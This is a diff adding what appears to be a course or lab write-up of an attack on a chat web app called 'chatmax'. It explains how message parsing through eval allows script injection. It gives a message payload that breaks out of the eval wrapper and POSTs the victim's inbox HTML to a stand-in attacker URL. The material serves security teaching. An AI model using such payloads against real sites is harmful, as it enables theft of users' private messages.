@@ -1,1 +1,43 @@
-TODO: thorougly describe your attack!
+EXFILTRATION ATTACK
+--------------------
+We will be able to exfiltrate the messages of any arbitrary username that you know. The exploit uses an insecure javascript method that gets called when a message is decoded. 
+
+<chatmax-min.js> (When the .js file is pretty-printed)
+Line 39 - 46
+var _6 = this.responseText.split(/\/\/END_MSG\/\/\0*/);
+var _7 = [];
+for (var i = 0; i < _6.length; i++) {
+    if (chatmax.validMsgStr(_6[i]) {
+        var _8 = "(function(){ return " + _6[i] + ";})()";
+        _7.push(eval(_8));
+    }
+}
+
+Note that this snippet of javascript code splits the index contents by END_MSG signs, and then puts the string into the return statement of a function and then evals the function. Using this unsafe method of getting the contents of an inbox, we can inject arbitrary code by just sending a malicious message, in the same way that SQL Injection attacks work. Consider the following message that we can send to a user:
+
+struckbyasmoothcriminal"};})();alert("lol");(function(){ return {"body":"test
+
+Note that this will prematurely end the previous message by adding in "};})();, execute arbitrary javascript code in the middle (in this case the alert statement), and then finish off with a dummy message return to make sure it parses on the other side. 
+
+Therefore, if we wanted to exfiltrate data, all we need to do is to replace the alert in the middle. For example, since we have full control over the JS on the page we can scrape the HTML from the page and send it to a rogue webserver which we control. Therefore, for our actual attack we will send this message using the send message prompt, putting in anything for the subject and putting the target in the To: section.
+
+struckbyasmoothcriminal"};})();var xhr = new XMLHttpRequest();xhr.open("POST", YOUR_MALICIOUS_URL_HERE, true);xhr.setRequestHeader('Content-Type', 'application/data');xhr.send(document.documentElement.innerHTML);(function(){ return {"body":"test   
+
+This basically takes the entire HTML of the page and sends it as a POST request to your server, which you should set up to recieve the message when it comes (when the target logs in and this javascript snippet gets executed). And basically, you have the HTML of the page the target sees, which should be all of their messages in their inbox.  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
